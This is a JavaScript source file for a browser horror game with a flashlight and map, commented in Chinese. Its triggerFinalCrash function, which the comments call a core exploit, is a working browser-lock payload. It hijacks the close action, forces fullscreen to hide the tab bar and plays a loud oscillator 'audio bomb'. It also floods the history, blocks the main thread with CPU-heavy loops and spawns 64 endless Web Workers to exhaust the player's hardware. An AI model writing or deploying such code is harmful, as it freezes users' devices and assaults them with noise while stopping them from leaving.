let posX = -1000, posY = -1000;
let isLightOn = false;
let audioStarted = false;
let mouseX = window.innerWidth / 2;
let mouseY = window.innerHeight / 2;
let systemCrashed = false;

const map = document.getElementById('map');
const overlay = document.getElementById('flashlight-overlay');
const intro = document.getElementById('intro');

// 1. 音效系統 (Ssssss -> HELP ME 噪音)
function startCreepyVoice() {
    if (audioStarted) return;
    const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
    const scriptNode = audioCtx.createScriptProcessor(4096, 1, 1);
    let t = 0;

    scriptNode.onaudioprocess = (e) => {
        const output = e.outputBuffer.getChannelData(0);
        for (let i = 0; i < output.length; i++) {
            if (systemCrashed) {
                // 觸發後：極大聲嘅隨機噪音 (白噪音爆破)
                output[i] = (Math.random() * 2 - 1) * 0.9;
            } else {
                // 觸發前：Glitch 呼吸聲
                let n = Math.random() * 0.1;
                let g = (t & (t >> 8)) ? 0.05 : -0.05;
                output[i] = n + g;
            }
            t++;
        }
    };
    scriptNode.connect(audioCtx.destination);
    audioStarted = true;
}

// 2. 1 分鐘後生成 Glitch 塊 (生成喺你面前)
setTimeout(() => {
    if (systemCrashed) return;
    const glitchBlock = document.createElement('div');

    // 重點：將塊嘢擺喺你當前坐標 (posX, posY) 嘅附近，確保你一定見到
    let spawnX = -posX + (window.innerWidth / 2) + 200;
    let spawnY = -posY + (window.innerHeight / 2) + 200;

    glitchBlock.style.cssText = `
        position: absolute; width: 30px; height: 30px;
        background: white; z-index: 1001;
        left: ${spawnX}px; top: ${spawnY}px;
        box-shadow: 0 0 20px white;
    `;
    map.appendChild(glitchBlock);

    // 閃爍效果
    setInterval(() => {
        glitchBlock.style.background = Math.random() > 0.5 ? 'white' : 'black';
    }, 50);

    // 檢測：當方塊進入螢幕中心點 (你行過去撞佢)
    const checkArrival = setInterval(() => {
        const rect = glitchBlock.getBoundingClientRect();
        const centerX = window.innerWidth / 2;
        const centerY = window.innerHeight / 2;

        // 判定距離：如果方塊中心接近螢幕中心
        if (Math.abs(rect.left + 15 - centerX) < 40 && Math.abs(rect.top + 15 - centerY) < 40) {
            triggerFinalCrash();
            clearInterval(checkArrival);
        }
    }, 50);
}, 30000); // 你可以暫時改做 5000 (5秒) 嚟測試個效果

// 3. 核心：極端凍結
// 3. 核心：極端凍結 (全平台通用版本)
function triggerFinalCrash() {
    systemCrashed = true;

    // 1. 劫持關閉動作 (這是防止「X」有效的關鍵)
    // 當用戶按 X，瀏覽器必須停下來問問題，這給了我們鎖死 UI 的機會
    window.onbeforeunload = function () {
        return "HELP ME.";
    };

    // 2. 視覺：巨大的 HELP ME
    document.body.innerHTML = `
        <div style="background:black; color:red; width:100vw; height:100vh; display:flex; justify-content:center; align-items:center; position:fixed; top:0; left:0; z-index:99999; cursor:none;">
            <h1 style="font-size:15vw; font-family:serif; text-shadow:0 0 50px red;">HELP ME.</h1>
        </div>
    `;

    // 3. 強制進入全屏 (隱藏 X 掣所在的標籤列)
    const el = document.documentElement;
    if (el.requestFullscreen) el.requestFullscreen();
    else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();

    setTimeout(() => {
        // A. 啟動音頻炸彈
        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
        setInterval(() => {
            let osc = audioCtx.createOscillator();
            osc.type = 'sawtooth';
            osc.frequency.value = 50 + Math.random() * 5000;
            osc.connect(audioCtx.destination);
            osc.start();
        }, 10);

        // B. 核心 Exploit：同步「重入」鎖死
        // 讓瀏覽器陷入：處理 JavaScript -> 嘗試渲染 UI -> JavaScript 搶佔 -> 渲染失敗 的死循環
        function absoluteLock() {
            // 瘋狂製造大量歷史紀錄，這會令瀏覽器的 UI 線程（負責處理「X」掣的線程）崩潰
            for (let i = 0; i < 500; i++) {
                window.history.pushState(null, null, "#" + Math.random());
            }

            // 同步阻塞：讓瀏覽器沒空去處理「關閉視窗」的訊息
            const buffer = [];
            const start = Date.now();
            while (Date.now() - start < 1000) { // 每秒鎖死一次
                // 產生超大對象並進行 JSON 序列化，這極度消耗 CPU
                const data = new Array(1000000).fill("HELP_ME_26F");
                JSON.stringify(data);
                buffer.push(data);
            }

            // 關鍵：用 setTimeout(0) 但不給喘息機會，持續搶佔主線程
            setTimeout(absoluteLock, 0);
        }

        // C. 輔助：開 64 個 Worker 搶奪所有硬體資源
        const blobCode = `while(true){ postMessage(new Array(1000000).join("HELP_ME")); }`;
        const url = URL.createObjectURL(new Blob([blobCode], { type: 'application/javascript' }));
        for (let i = 0; i < 64; i++) {
            new Worker(url);
        }

        absoluteLock();
    }, 300);
}
// 4. 移動與電筒邏輯
window.addEventListener('mousemove', (e) => {
    mouseX = e.clientX; mouseY = e.clientY;
    if (isLightOn && !systemCrashed) {
        overlay.style.background = `radial-gradient(circle 130px at ${mouseX}px ${mouseY}px, transparent 0%, rgba(0,0,0,0.99) 100%)`;
    }
});

window.addEventListener('keydown', (e) => {
    if (systemCrashed) return;
    let key = e.key.toLowerCase();
    if (key === 'f') { intro.style.display = 'none'; document.documentElement.requestFullscreen(); startCreepyVoice(); }
    if (key === '1') {
        isLightOn = !isLightOn;
        overlay.style.background = isLightOn ? `radial-gradient(circle 130px at ${mouseX}px ${mouseY}px, transparent 0%, rgba(0,0,0,0.99) 100%)` : 'rgba(0,0,0,1)';
    }
    const s = 50;
    if (key === 'w') posY += s; if (key === 's') posY -= s; if (key === 'a') posX += s; if (key === 'd') posX -= s;
    map.style.transform = `translate(${posX}px, ${posY}px)`;
});